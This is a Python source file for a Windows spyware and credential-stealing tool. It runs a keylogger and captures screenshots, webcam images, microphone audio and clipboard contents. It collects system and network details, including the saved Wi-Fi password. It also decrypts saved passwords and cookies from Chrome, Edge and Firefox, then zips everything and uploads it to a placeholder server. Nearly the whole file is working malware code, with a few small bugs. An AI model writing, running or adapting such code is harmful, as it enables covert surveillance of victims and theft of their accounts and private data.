import os
import json
import logging
import threading
from pynput.keyboard import Listener
from PIL import ImageGrab
import cv2
from multiprocessing import Process, freeze_support
import time
import sounddevice as sd
from scipy.io.wavfile import write as wav_write
import pyperclip
import subprocess
import sqlite3
import shutil
import base64
from datetime import datetime, timedelta, timezone
import win32crypt
from Crypto.Cipher import AES, DES3  
import ctypes as ct
from base64 import b64decode
import csv
from configparser import ConfigParser
import zipfile
import requests

# Define the paths
files_directory = 'C:/Windows/System32/Files'
screenshots_directory = os.path.join(files_directory, 'Screenshots')
keylog_file_path = os.path.join(files_directory, 'keylog.txt')
pictures_directory = os.path.join(files_directory, 'Pictures')
audio_directory = os.path.join(files_directory, 'Audio')
clipboard_directory = os.path.join(files_directory, 'Clipboard')
system_info_file_path = os.path.join(files_directory, 'system_info.txt')
network_directory = os.path.join(files_directory, 'Network')
wifi_info_file = os.path.join(network_directory, 'wifi_info.txt')
browsers_directory = os.path.join(files_directory, 'Browsers')
chrome_cookies_output_file = os.path.join(browsers_directory, 'Chrome_cookies.txt')
chrome_history_output_file = os.path.join(browsers_directory, 'Chrome_history.txt')
chrome_bookmarks_output_file = os.path.join(browsers_directory, 'Chrome_bookmarks.txt')
chrome_passwords_output_file = os.path.join(browsers_directory, 'Chrome_passwords.txt')
edge_passwords_output_file = os.path.join(browsers_directory, 'Edge_passwords.txt')
edge_bookmarks_output_file = os.path.join(browsers_directory, 'Edge_bookmarks.txt')
edge_history_output_file = os.path.join(browsers_directory, 'Edge_history.txt')
edge_cookies_output_file = os.path.join(browsers_directory, 'Edge_cookies.txt')
firefox_history_output_file = os.path.join(browsers_directory, 'Firefox_history.txt')
firefox_bookmarks_output_file = os.path.join(browsers_directory, 'Firefox_bookmarks.txt')
firefox_cookies_output_file = os.path.join(browsers_directory, 'Firefox_cookies.txt')
firefox_passwords_output_file = os.path.join(browsers_directory, 'Firefox_passwords.txt')

# Create the directories if they don't exist
os.makedirs(files_directory, exist_ok=True)
os.makedirs(screenshots_directory, exist_ok=True)
os.makedirs(pictures_directory, exist_ok=True)
os.makedirs(audio_directory, exist_ok=True)
os.makedirs(clipboard_directory, exist_ok=True)
os.makedirs(network_directory, exist_ok=True)
os.makedirs(browsers_directory, exist_ok=True)

def on_press(key): 
    logging.info(f"Key pressed: {key}")
    
logging.basicConfig(filename=keylog_file_path, level=logging.INFO, format='%(asctime)s: %(message)s')


def take_screenshot():
    print(f"Screenshot process started.")
    while True:
        try:
            screenshot = ImageGrab.grab()
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            screenshot_path = os.path.join(screenshots_directory, f'screenshot_{timestamp}.png')
            screenshot.save(screenshot_path)
            print("Screenshot taken")
        except Exception as e:
            print("An error occurred while taking screenshots", str(e))
        
            time.sleep(5)  # Change the interval as needed

def take_pictures():
    print(f"Pictures process started.")
    try:
        cam = cv2.VideoCapture(0)
        while True:
            ret, frame = cam.read()
            if ret:
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                picture_path = os.path.join(pictures_directory, f'picture_{timestamp}.jpg')
                cv2.imwrite(picture_path, frame)
                print("Picture taken")
            time.sleep(5)  # Adjust the interval as needed
    except Exception as e:
        print("An error occurred while taking pictures:", str(e))
    finally:
        cam.release()
        cv2.destroyAllWindows()

def record_audio():
    print(f"Audio process started.")
    try:
        fs = 44100  # Sample rate
        duration = 15  # Recording duration in seconds
        while True:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            audio_file_path = os.path.join(audio_directory, f'audio_{timestamp}.wav')
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()  # Wait for the recording to finish
            wav_write(audio_file_path, fs, recording)
            print("Audio recorded")
            time.sleep(5)  # Adjust the interval as needed
    except Exception as e:
        print("An error occurred while recording audio:", str(e))

def capture_clipboard_data():
    print(f"Clipboard process started.")
    try:
        while True:
            clipboard_data = pyperclip.paste()
            if clipboard_data:
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                clipboard_file_path = os.path.join(clipboard_directory, f'Clipboard_{timestamp}.txt')
                with open(clipboard_file_path, 'w') as clipboard_file:
                    clipboard_file.write(f"{clipboard_data}\n")
                print("Clipboard captured")
            time.sleep(5)  # Adjust the interval as needed
    except Exception as e:
        print("An error occurred while capturing clipboard data:", str(e))

def gather_system_info():
    print(f"System info process started.")
    try:
        with open(system_info_file_path, 'w') as sys_info_file:
            subprocess.run(['systeminfo'], stdout=sys_info_file, stderr=subprocess.PIPE, text=True)
            print("System information gathered successfully")
    except Exception as e:
        print("An error occurred while gathering system information:", str(e))

def gather_network_info():
    print(f"Network info process started.")
    network_info_file_path = os.path.join(network_directory, 'network_info.txt')
    try:
        with open(network_info_file_path, 'w') as network_info_file:
            subprocess.run(['ipconfig', '/all'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['arp', '-a'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['getmac', '-V'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['route', 'print'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['netstat', '-ano'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
            print("Network information gathered successfully")
    except Exception as e:
        print("An error occurred while gathering network information:", str(e))

def gather_wifi_info():
    print(f"Wi-fi process started.")
    try:
        # Fetch the SSID of the currently connected network
        current_network_info = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], shell=True).decode('utf-8', errors='ignore')
        current_ssid_line = [line for line in current_network_info.split('\n') if "SSID" in line and "BSSID" not in line]
        
        if current_ssid_line:
            current_ssid = current_ssid_line[0].split(":")[1].strip()            
        else:
            raise Exception("No connected Wi-Fi network found.")

        # Fetch the password of the current network
        password_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name="{current_ssid}"', 'key=clear'], shell=True).decode('utf-8', errors='ignore')

        # Write the information to the file
        with open(wifi_info_file, 'w') as file:
            file.write(f"Current Network SSID: {current_ssid}\nPassword Info:\n{password_info}")
        print("Wi-Fi information gathered successfully")
    except subprocess.CalledProcessError as e:
        print("Error while fetching Wi-Fi information:", str(e))
    except Exception as e:
        print("An error occurred while gathering Wi-Fi information:", str(e))

## CHROME FUNCTIONS ##
def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error code -1: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_chrome_encryption_key():
    print(f" Chrome encryption key process started.")
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    try:
        with open(local_state_path, "r", encoding="UTF-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error code -1: {e}")
        return None

def decrypt_data(data, key):
    print(f"Chrome decryption process started.")
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except Exception as e2:
            print(f"Error code -1: {e2}")
            return ""

# Cookies
def extract_chrome_cookies(output_file):
    print(f"Chrome cookies process started.")
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
                               "Local", "Google", "Chrome", "User Data", "Default",
                               "Network", "Cookies")

        db = sqlite3.connect(db_path)
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc,
        expires_utc, encrypted_value
        FROM Cookies""")

        key = get_chrome_encryption_key()
        if key:
            with open(output_file, "w", encoding="utf-8") as cookies_file:
                for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                    if not value:
                        decrypted_value = decrypt_data(encrypted_value, key)
                    else:
                        decrypted_value = value
                    cookies_file.write(f"Host: {host_key}\n")
                    cookies_file.write(f"Cookie Name: {name}\n")
                    cookies_file.write(f"Cookie Value (decrypted): {decrypted_value}\n")
                    cookies_file.write(f"Creation Date: {get_chrome_datetime(creation_utc)}\n")
                    cookies_file.write(f"Last Access Date: {get_chrome_datetime(last_access_utc)}\n")
                    cookies_file.write(f"Expires Date: {get_chrome_datetime(expires_utc)}\n")
                    cookies_file.write("=" * 50 + "\n\n")
            print("Chrome cookies extracted successfully. Success code 0")
        else:
            print("Error code -1: Chrome encryption key not found.")
    except PermissionError as e:
        print(f"PermissionError: {e}")
        print("Error code -1: Chrome cookies extraction failed.")
    except Exception as e:
        print(f"Error code -1: An error occurred while extracting Chrome cookies: {e}")
    finally:
        db.close()

# History
def extract_chrome_history(output_file):
    print(f"Chrome history process started.")
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
                               "Local", "Google", "Chrome", "User Data", "Default",
                               "History")

        db = sqlite3.connect(db_path)
        cursor = db.cursor()

        cursor.execute("""
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visited,
        title, url FROM urls""")

        with open(output_file, "w", encoding="utf-8") as history_file:
            for row in cursor.fetchall():
                last_visited, title, url = row
                history_file.write(f"Last Visited: {last_visited}\n")
                history_file.write(f"Title: {title}\n")
                history_file.write(f"URL: {url}\n")
                history_file.write("=" * 50 + "\n\n")
        print("Chrome history extracted successfully. Success code 0")

    except PermissionError as e:
        print(f"PermissionError: {e}")
        print("Error code -1: Chrome history extraction failed.")
    except Exception as e:
        print(f"Error code -1: Error extracting history: {e}")
    finally:
        db.close()

# Bookmarks
def extract_chrome_bookmarks(output_file):
    print(f"Chrome bookmarks process started.")
    chrome_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    bookmarks_path = os.path.join(chrome_data_path, 'Bookmarks')

    if not os.path.exists(bookmarks_path):
        print(f"No bookmarks file found at {bookmarks_path}")
        return

    try:
        with open(bookmarks_path, 'r', encoding='utf-8') as file:
            bookmarks_data = json.load(file)

        with open(output_file, 'w', encoding='utf-8') as file:
            def traverse_bookmarks(node):
                if 'type' in node and node['type'] == 'url':
                    file.write(f"Title: {node.get('name', 'N/A')}\n")
                    file.write(f"URL: {node.get('url', 'N/A')}\n")
                    file.write("=" * 50 + "\n\n")
                elif 'children' in node:
                    for child in node['children']:
                        traverse_bookmarks(child)

            for root_node in bookmarks_data['roots']:
                traverse_bookmarks(bookmarks_data['roots'][root_node])
        print("Chrome bookmarks extracted successfully. Success code 0")

    except Exception as e:
        print(f"Error code -1: Error extracting Chrome bookmarks: {str(e)}")

# Passwords
def extract_chrome_passwords(output_file):
    print(f"Chrome passwords process started.")
    try:
        key = get_chrome_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        with open(output_file, "w", encoding="utf-8") as passwords_file:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_data(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    passwords_file.write(f"URL: {origin_url}\n")
                    passwords_file.write(f"Username: {username}\n")
                    passwords_file.write(f"Password: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created: 
                    passwords_file.write("=" * 50 + "\n\n")
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
        print("Chrome passwords extracted successfully. Success code 0")

    except PermissionError as e:
        print(f"PermissionError: {e}")
        print("Error code -1: Chrome passwords extraction failed.")

## EDGE
def get_edge_datetime(edgedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=edgedate)

#Bookmarks
def extract_edge_bookmarks(output_file):
    print(f"Edge bookmarks process started.")
    edge_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
    bookmarks_path = os.path.join(edge_data_path, 'Bookmarks')

    if not os.path.exists(bookmarks_path):
        print(f"No bookmarks file found at {bookmarks_path}")
        return

    try:
        with open(bookmarks_path, 'r', encoding='utf-8') as file:
            bookmarks_data = json.load(file)

        with open(output_file, 'w', encoding='utf-8') as file:
            def traverse_bookmarks(node):
                if 'type' in node and node['type'] == 'url':
                    file.write(f"Title: {node.get('name', 'N/A')}\n")
                    file.write(f"URL: {node.get('url', 'N/A')}\n")
                    file.write("=" * 50 + "\n\n")
                elif 'children' in node:
                    for child in node['children']:
                        traverse_bookmarks(child)

            for root_node in bookmarks_data['roots']:
                traverse_bookmarks(bookmarks_data['roots'][root_node])
        print("Edge bookmarks extracted successfully.")

    except Exception as e:
        print(f"Error extracting Edge bookmarks: {str(e)}")

#History
def extract_edge_history(output_file):
    print(f"Edge history process started.")
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Microsoft", "Edge", "User Data", "Default", "History")

        db = sqlite3.connect(db_path)
        cursor = db.cursor()

        cursor.execute("""
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visited,
        title, url FROM urls""")

        with open(output_file, "w", encoding="utf-8") as history_file:
            for row in cursor.fetchall():
                last_visited, title, url = row
                history_file.write(f"Last Visited: {last_visited}\n")
                history_file.write(f"Title: {title}\n")
                history_file.write(f"URL: {url}\n")
                history_file.writewrite("=" * 50 + "\n\n")
        print("Edge history extracted successfully. Success code 0")

    except PermissionError as e:
        print(f"PermissionError: {e}")
        print("Error code -1: Edge history extraction failed.")
    except Exception as e:
        print(f"Error code -1: An error occurred: {e}")
    finally:
        db.close()

#Cookies
def extract_edge_cookies(output_file):
    print(f"Edge cookies process started.")
    db = None
    try:
        original_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Microsoft", "Edge", "User Data", "Default",
                                        "Network", "Cookies")
        if not os.path.isfile(original_db_path):
            raise FileNotFoundError(f"Edge cookies database not found at {original_db_path}")

        temp_db_path = os.path.join(os.path.dirname(__file__), "temp_EdgeCookies.db")

        shutil.copyfile(original_db_path, temp_db_path)

        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()

        cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM Cookies")

        key = get_edge_encryption_key()

        with open(output_file, "w", encoding="utf-8") as cookies_file:
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                decrypted_value = value if value else edge_decrypted_password(encrypted_value, key)
                cookies_file.write(f"Host: {host_key}\n")
                cookies_file.write(f"Cookie Name: {name}\n")
                cookies_file.write(f"Cookie Value (decrypted): {decrypted_value}\n")
                cookies_file.write(f"Creation Date: {get_edge_datetime(creation_utc)}\n")
                cookies_file.write(f"Last Access Date: {get_edge_datetime(last_access_utc)}\n")
                cookies_file.write(f"Expires Date: {get_edge_datetime(expires_utc)}\n")
                cookies_file.write("=" * 50 + "\n\n")
                print("Edge cookies extracted successfully.")

    except FileNotFoundError as e:
        print(f"File not found error: {e}")
        print("Error code -1: Edge cookies extraction failed.")
    except Exception as e:
        print(f"Error code -1: Error extracting Edge cookies: {e}")
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"Error cleaning up temporary files: {e}")

def get_edge_encryption_key():
    print(f"Edge encryption key process started.")
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Microsoft", "Edge", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state['os_crypt']["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error code -1: Failed to get Edge encryption key: {e}")
        return None

def edge_decrypted_password(password, key):
    print(f"Edge decryption process started.")
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()
        print("Edge password decrypted successfully")
        return decrypted_password
    except Exception as e:
        try:
            decrypted_password = str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            print("Edge password decrypted successfully")
            return decrypted_password
        except Exception as e:
            print(f"Error decrypting Edge password: {e}")
            return ""

#Passwords
def extract_edge_passwords(output_file):
    print(f"Edge passwords process started.")
    try:
        key = get_edge_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Microsoft", "Edge", "User Data", "Default", "Login Data")
        filename = "EdgePasswordsData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        with open(output_file, "w", encoding="utf-8") as passwords_file:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = edge_decrypted_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    passwords_file.write(f"URL: {origin_url}\n")
                    passwords_file.write(f"Username: {username}\n")
                    passwords_file.write(f"Password: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    passwords_file.write("=" * 50 + "\n\n")
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass

    except PermissionError as e:
        print(f"PermissionError: {e}")
    except Exception as e:
        print(f"Error extracting Edge passwords: {e}")

## FIREFOX
def get_firefox_datetime(firefoxdate):
    return datetime(1970, 1, 1) + timedelta(microseconds=firefoxdate)

#History
def extract_firefox_history(output_file):
    print(f"Firefox process started.")
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    for profile in os.listdir(firefox_profile_path):
        if profile.endswith('.default-release'):
            db_path = os.path.join(firefox_profile_path, profile, "places.sqlite")
            break

    if not os.path.isfile(db_path):
        print("Firefox history database does not exist.")
        return

    temp_db_path = os.path.join(os.path.dirname(__file__), "temp_FirefoxHistory.db")
    shutil.copyfile(db_path, temp_db_path)

    try:
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()
        query = "SELECT url, title, visit_date FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id"
        cursor.execute(query)

        with open(output_file, "w", encoding="utf-8") as history_file:
            for url, title, visit_date in cursor.fetchall():
                history_file.write(f"URL: {url}\n")
                history_file.write(f"Title: {title}\n")
                history_file.write(f"Visit Date: {datetime.fromtimestamp(visit_date/1000000)}\n")
                history_file.write("=" * 50 + "\n\n")

        print(f"Firefox history extracted successfully.")
    except Exception as e:
        print(f"Error extracting Firefox history: {e}")
    finally:
        db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"Error cleaning up temporary files: {e}")

def extract_firefox_bookmarks(output_file):
    print(f"Firefox bookmarks process started.")
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    for profile in os.listdir(firefox_profile_path):
        if profile.endswith('.default-release'):
            db_path = os.path.join(firefox_profile_path, profile, "places.sqlite")
            break

    if not os.path.isfile(db_path):
        print("Firefox bookmarks database does not exist.")
        return

    temp_db_path = os.path.join(os.path.dirname(__file__), "temp_FirefoxBookmarks.db")
    shutil.copyfile(db_path, temp_db_path)

    try:
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()
        query = "SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id WHERE moz_bookmarks.type = 1"
        cursor.execute(query)

        with open(output_file, "w", encoding="utf-8") as bookmarks_file:
            for title, url in cursor.fetchall():
                bookmarks_file.write(f"Title: {title}\n")
                bookmarks_file.write(f"URL: {url}\n")
                bookmarks_file.write("=" * 50 + "\n\n")

        print(f"Firefox bookmarks extracted successfully.")
    except Exception as e:
        print(f"Error extracting Firefox bookmarks: {e}")
    finally:
        db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"Error cleaning up temporary files: {e}")


#COOKIES
def extract_firefox_cookies(output_file):
    print(f"Firefox cookies process started.")
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    for profile in os.listdir(firefox_profile_path):
        if profile.endswith('.default-release'):
            cookies_db_path = os.path.join(firefox_profile_path, profile, "cookies.sqlite")
            break

    if not os.path.isfile(cookies_db_path):
        print("Firefox cookies database does not exist.")
        return

    temp_db_path = os.path.join(os.path.dirname(__file__), "temp_FirefoxCookies.db")
    shutil.copyfile(cookies_db_path, temp_db_path)

    try:
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()
        cursor.execute("SELECT name, value, host, path, expiry FROM moz_cookies")

        with open(output_file, "w", encoding="utf-8") as cookies_file:
            for name, value, host, path, expiry in cursor.fetchall():
                cookies_file.write(f"Host: {host}\n")
                cookies_file.write(f"Cookie Name: {name}\n")
                cookies_file.write(f"Cookie Value (decrypted): {value}\n")
                cookies_file.write("=" * 50 + "\n\n")

        print(f"Firefox cookies extracted successfully.")
    except Exception as e:
        print(f"Error extracting Firefox cookies: {e}")
    finally:
        db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"Error cleaning up temporary files: {e}")

#PASSWORDS
FIREFOX_PATH = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")

class SECItem(ct.Structure):
    _fields_ = [
        ("type", ct.c_int),
        ("data", ct.c_char_p),
        ("len", ct.c_int),
    ]
    def decode_data(self):
        _bytes = ct.string_at(self.data, self.len)
        return _bytes.decode('utf-8')

def getAllProfiles(profile_path: str) -> list:
    print(f"Firefox profiles identification process started.")
    ini = os.path.join(profile_path, "profiles.ini")
    if not os.path.isfile(ini):
        raise Exception(f'profile.ini not found in path {profile_path}.')

    profiles = ConfigParser()
    profiles.read(ini, encoding='utf-8')
    sections = {}
    for section in profiles.sections():
        if section.startswith("Profile"):
            sections[profiles.get(section, "Path")] = None

    return [os.path.join(profile_path, section, 'logins.json') for section in sections]

def locateAndLoadNss() -> ct.CDLL:
    print(f"Firefox NSS process started.")
    nnsName = 'nss3.dll'
    locations: list[str] = [
        "",  
        os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox"),
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Firefox",
    ]

    for loc in locations:
        nsslib = os.path.join(loc, nnsName)
        try:
            nss: ct.CDLL = ct.CDLL(nsslib)
            return nss
        except OSError:
            continue

    raise FileNotFoundError("Could not find or load 'nss3.dll'.")

def firefox_decrypt(profile: str, data, nss):
    print(f"Firefox decryption process started.")
    PK11_ReadRawAttribute = nss.PK11_ReadRawAttribute
    PK11_ReadRawAttribute.argtypes = [ct.c_char_p, ct.c_char_p, ct.POINTER(SECItem)]
    PK11_ReadRawAttribute.restype = ct.c_int

    PK11SDR_Decrypt = nss.PK11SDR_Decrypt
    PK11SDR_Decrypt.argtypes = [ct.POINTER(SECItem), ct.POINTER(SECItem), ct.c_void_p]
    PK11SDR_Decrypt.restype = ct.c_int

    profile_path = b"sql:" + bytes(profile.strip('logins.json'), 'utf-8')
    if nss.NSS_Init(profile_path) != 0:
        raise Exception("NSS Library initialization failed!")

    data = b64decode(data)
    inp = SECItem(0, data, len(data))
    out = SECItem(0, None, 0)
    if PK11SDR_Decrypt(inp, out, None) == 0:
        return out.decode_data()
    else:
        print(f"Failed to decrypt data for {profile}.")
        return 'Cannot be decrypted'

def extract_and_format_firefox_passwords(output_file):
    print(f"Firefox passwords process started.")
    try:
        nss = locateAndLoadNss()
    except FileNotFoundError as e:
        print(e)
        return

    with open(output_file, mode='w', encoding='utf-8') as passwords_file:
        for profile in getAllProfiles(FIREFOX_PATH):
            if not os.path.isfile(profile):
                continue

            try:
                with open(profile) as f:
                    data = json.load(f)

                logins = data.get("logins", [])
                for login in logins:
                    decryptedUsername = firefox_decrypt(profile, login['encryptedUsername'], nss)
                    decryptedPassword = firefox_decrypt(profile, login['encryptedPassword'], nss)
                    passwords_file.write(f"URL: {login['hostname']}\n")
                    passwords_file.write(f"Username: {decryptedUsername}\n")
                    passwords_file.write(f"Password: {decryptedPassword}\n")
                    passwords_file.write("="*80 + "\n\n")

            except Exception as e:
                print(f"Error processing profile {profile}: {e}")

def run_keylogger():
    print(f"Keylogger process started.")
    with Listener(on_press=on_press) as listener:
        listener.join()


import zipfile

def zip_directories_and_files(directories, output_zip_file):
    print(f"Zipping process started.")
    with zipfile.ZipFile(output_zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for directory in directories:
            if os.path.isdir(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if file != 'files.zip':
                            zipf.write(os.path.join(root, file), 
                                    os.path.relpath(os.path.join(root, file), 
                                    os.path.join(directory, '..')))
            elif os.path.isfile(directory):
                zipf.write(directory, os.path.basename(directory))


directories_to_zip = [
    files_directory
]

def main2 ():
    try:
        print(f"Main started")
        threading.Thread(target=take_screenshot).start()
        print("Screenshot started")
        threading.Thread(target=take_pictures).start()
        print("Pictures started")
        threading.Thread(target=record_audio).start()
        print("Mic started")
        threading.Thread(target=capture_clipboard_data).start()
        print("Clipboard started")
        
        gather_system_info()  
        gather_network_info()  
        gather_wifi_info()  

        extract_chrome_cookies(chrome_cookies_output_file)
        print(f"Chrome cookies extracted to {chrome_cookies_output_file}")
        
        extract_chrome_history(chrome_history_output_file)
        print(f"Chrome history extracted to {chrome_history_output_file}")
        
        extract_chrome_bookmarks(chrome_bookmarks_output_file)
        print(f"Chrome bookmarks extracted to {chrome_bookmarks_output_file}")
        
        extract_chrome_passwords(chrome_passwords_output_file)
        print(f"Chrome passwords extracted to {chrome_passwords_output_file}")

        extract_edge_passwords(edge_passwords_output_file)
        print(f"Edge passwords extracted to {edge_passwords_output_file}")
        
        extract_edge_bookmarks(edge_bookmarks_output_file)
        print(f"Edge bookmarks extracted to {edge_bookmarks_output_file}")
        
        extract_edge_history(edge_history_output_file)
        print(f"Edge history extracted to {edge_history_output_file}")
        
        extract_edge_cookies(edge_cookies_output_file)
        print(f"Edge cookies extracted to {edge_cookies_output_file}")

        extract_firefox_history(firefox_history_output_file)
        print(f"Firefox history extracted to {firefox_history_output_file}")
        
        extract_firefox_bookmarks(firefox_bookmarks_output_file)
        print(f"Firefox bookmarks extracted to {firefox_bookmarks_output_file}")
        
        extract_firefox_cookies(firefox_cookies_output_file)
        print(f"Firefox cookies extracted to {firefox_cookies_output_file}")
        
        extract_and_format_firefox_passwords(firefox_passwords_output_file)
        print(f"Firefox passwords extracted to {firefox_passwords_output_file}")

        run_keylogger()
    except Exception as e:
        print(f"An error o-n ccurred: {e}") 

if __name__ == "__main__":
    freeze_support()
    print(f"Init program....")
    ()
    # Start the main function as a process
    p = Process(target=main2)
    p.start()
    print(f"Main should be running...")
    # Wait for one minute
    print(f"After sleeping")

    # Terminate the process after one minute
    time.sleep(60)
    
    try:
        zip_directories_and_files(directories_to_zip, 'C:\\Windows\\System32\\Files\\files.zip')
        print("Zipping completed successfully.")
        
        url = 'http://localhost:3000/upload'  # Replace with your Flask API URL
        files = {'file': open('C:\\Windows\\System32\\Files\\files.zip', 'rb')}  # Replace 'yourfile.txt' with your file name
        response = requests.post(url, files=files)
    except Exception as e:
        print(response.text)
        print(f"An error occurred during zipping or file upload: {e}")
    p.terminate()
    # p.join()
